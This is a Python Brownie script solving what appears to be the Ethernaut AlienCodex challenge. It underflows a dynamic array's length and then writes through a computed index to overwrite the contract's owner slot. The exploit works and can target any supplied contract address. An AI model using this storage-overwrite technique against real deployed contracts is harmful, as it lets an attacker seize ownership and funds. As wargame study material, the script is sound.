#!/usr/bin/python3
from brownie import AlienCodex, web3, convert
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore
from eth_utils import keccak

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        alien_codex, _ = deploy()
        contract_address = alien_codex.address
        _, attacker = get_account()
    else:
        alien_codex = AlienCodex.at(contract_address)

    print(f"{green}Owner:    {red}{alien_codex.owner()}{reset}")
    print(f"{green}Attacker: {red}{attacker}{reset}")

    # * set contact = True
    alien_codex.make_contact({"from": attacker})

    # * underflow the array
    alien_codex.retract({"from": attacker})

    # ? 0th slot => bool(1 byte) + address of the owner(20 bytes)
    # ? 1th slot is the next var i.e. the array `codex` but as it's a dynamic only the size is stored at the slot

    # * not necessary just to see
    array_size = web3.eth.get_storage_at(contract_address, 1).hex()
    print(f"{green}Size of the storage: {red}{convert.to_uint(array_size)}{reset}")

    """
    location of the elements are calculated by the formula keccak(k . p)
    p = position 
    k = value corresponding to the mapping
    `.` = concatenation

    1st memory location i.e. codex[0] -> i = 2^256 - p or 2^256 - keccak256(1) of codex
    """

    first_location = convert.to_uint(keccak(convert.to_bytes(1)))
    zeroTh_location = 2**256 - first_location

    # print(zeroTh_location)

    alien_codex.revise(zeroTh_location, attacker.address, {"from": attacker})

    print(f"{green}Owner: {red}{alien_codex.owner()}{reset}")
    print(f"{green}Attacker: {red}{attacker}{reset}")

    assert alien_codex.owner() == attacker.address


def main(contract_address=None, attacker=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()


if __name__ == "__main__":
    main()
